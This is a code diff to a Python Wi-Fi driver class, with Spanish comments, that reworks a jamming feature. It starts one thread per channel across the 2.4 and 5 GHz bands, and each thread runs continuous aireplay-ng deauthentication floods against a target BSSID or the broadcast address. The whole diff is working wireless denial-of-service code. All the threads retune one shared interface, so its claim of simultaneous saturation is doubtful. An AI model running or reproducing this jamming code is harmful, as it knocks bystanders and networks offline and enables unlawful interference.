@@ -130,6 +130,7 @@ class WiFiDriver:
         # Jamming de banda completa
         self.jam_all_bands_active = False
         self.jam_thread = None
+        self.jam_processes = []  # Lista de procesos de jamming activos
         
         # Filtros
         self.bssid_filter: Optional[str] = None
@@ -867,12 +868,28 @@ class WiFiDriver:
                 return True
             
             else:
-                # Jamming en múltiples canales - usar thread para cambiar canales
+                # Jamming en múltiples canales - usar múltiples threads para saturar todos los canales simultáneamente
                 self.jam_all_bands_active = True
                 self.jam_process = None  # No usamos proceso único
-                self.jam_thread = threading.Thread(target=self._jam_multiple_channels_loop, 
-                                                   args=(target_bssid, jam_mode), daemon=True)
-                self.jam_thread.start()
+                
+                # Determinar canales a usar
+                if jam_mode == "band_2_4":
+                    channels_to_jam = self.CHANNELS_2_4
+                elif jam_mode == "band_5":
+                    channels_to_jam = self.CHANNELS_5
+                elif jam_mode == "all":
+                    channels_to_jam = self.CHANNELS_2_4 + self.CHANNELS_5
+                else:
+                    channels_to_jam = [self.current_channel]
+                
+                # Crear un thread por cada canal para saturación simultánea
+                self.jam_threads = []
+                for channel in channels_to_jam:
+                    thread = threading.Thread(target=self._jam_single_channel_loop, 
+                                            args=(channel, target_bssid), daemon=True)
+                    thread.start()
+                    self.jam_threads.append(thread)
+                
                 return True
         
         except FileNotFoundError:
@@ -882,74 +899,68 @@ class WiFiDriver:
             print(f"ERROR iniciando jamming: {e}")
             return False
     
-    def _jam_multiple_channels_loop(self, target_bssid: Optional[str] = None, jam_mode: str = "all"):
-        """Loop para jamming en múltiples canales cambiando automáticamente"""
+    def _jam_single_channel_loop(self, channel: int, target_bssid: Optional[str] = None):
+        """Loop para jamming en un canal específico de forma continua"""
         interface = self.monitor_interface or self.interface
         if not interface:
             return
         
-        # Determinar qué canales usar según el modo
-        if jam_mode == "band_2_4":
-            channels_to_jam = self.CHANNELS_2_4
-        elif jam_mode == "band_5":
-            channels_to_jam = self.CHANNELS_5
-        elif jam_mode == "all":
-            channels_to_jam = self.CHANNELS_2_4 + self.CHANNELS_5
-        else:
-            channels_to_jam = [self.current_channel]  # Fallback
-        
-        # Filtrar canales problemáticos comunes (DFS, deshabilitados)
-        # Canales 5 GHz que requieren DFS y pueden estar deshabilitados
+        # Canales problemáticos que pueden fallar
         problematic_channels = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]
         
         while getattr(self, 'jam_all_bands_active', False):
-            for channel in channels_to_jam:
-                if not getattr(self, 'jam_all_bands_active', False):
-                    break
-                
-                # Saltar canales problemáticos si fallan
-                if channel in problematic_channels:
-                    # Intentar cambiar, pero si falla, saltar silenciosamente
-                    if not self.set_channel(channel, silent=True):
-                        continue
-                else:
-                    # Para otros canales, intentar cambiar
-                    if not self.set_channel(channel, silent=True):
-                        continue
-                
-                try:
-                    time.sleep(0.2)  # Pausa para cambio de canal
-                    
-                    # Iniciar deauth en este canal con más paquetes y tiempo
-                    # Usar 0 para infinito, pero limitar tiempo de ejecución
-                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
-                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    
-                    # Esperar más tiempo en cada canal para que sea efectivo
-                    # Para "all", usar menos tiempo por canal para cubrir más rápido
-                    if jam_mode == "all":
-                        wait_time = 0.8  # 0.8 segundos por canal cuando son muchos
-                    elif jam_mode in ["band_2_4", "band_5"]:
-                        wait_time = 1.2  # 1.2 segundos por canal cuando es una banda
+            try:
+                # Intentar cambiar a este canal
+                if not self.set_channel(channel, silent=True):
+                    # Si es un canal problemático, esperar más antes de reintentar
+                    if channel in problematic_channels:
+                        time.sleep(2)
                     else:
-                        wait_time = 1.5  # 1.5 segundos por canal por defecto
-                    
-                    time.sleep(wait_time)
-                    
-                    # Terminar proceso antes de cambiar de canal
+                        time.sleep(0.5)
+                    continue
+                
+                time.sleep(0.1)  # Pequeña pausa después de cambiar canal
+                
+                # Iniciar deauth infinito en este canal
+                cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                
+                # Guardar proceso para poder terminarlo después
+                if not hasattr(self, 'jam_processes'):
+                    self.jam_processes = []
+                self.jam_processes.append(process)
+                
+                # Mantener el proceso corriendo mientras el jamming esté activo
+                # Verificar periódicamente si debemos continuar
+                while getattr(self, 'jam_all_bands_active', False):
+                    time.sleep(0.5)
+                    # Verificar si el proceso sigue corriendo
+                    if process.poll() is not None:
+                        # Proceso terminó, reiniciar
+                        break
+                
+                # Terminar proceso cuando salimos del loop
+                try:
+                    process.terminate()
+                    process.wait(timeout=1)
+                except:
                     try:
-                        process.terminate()
+                        process.kill()
                         process.wait(timeout=1)
                     except:
-                        try:
-                            process.kill()
-                            process.wait(timeout=1)
-                        except:
-                            pass
+                        pass
                 
-                except Exception as e:
-                    # Continuar con siguiente canal si hay error
-                    continue
+                # Remover de la lista
+                if hasattr(self, 'jam_processes') and process in self.jam_processes:
+                    self.jam_processes.remove(process)
+                
+                # Pequeña pausa antes de reiniciar
+                time.sleep(0.2)
+                
+            except Exception as e:
+                # Si hay error, esperar un poco antes de reintentar
+                time.sleep(1)
+                continue
     
     def stop_jamming(self):
         """Detiene el jamming con mejor manejo"""
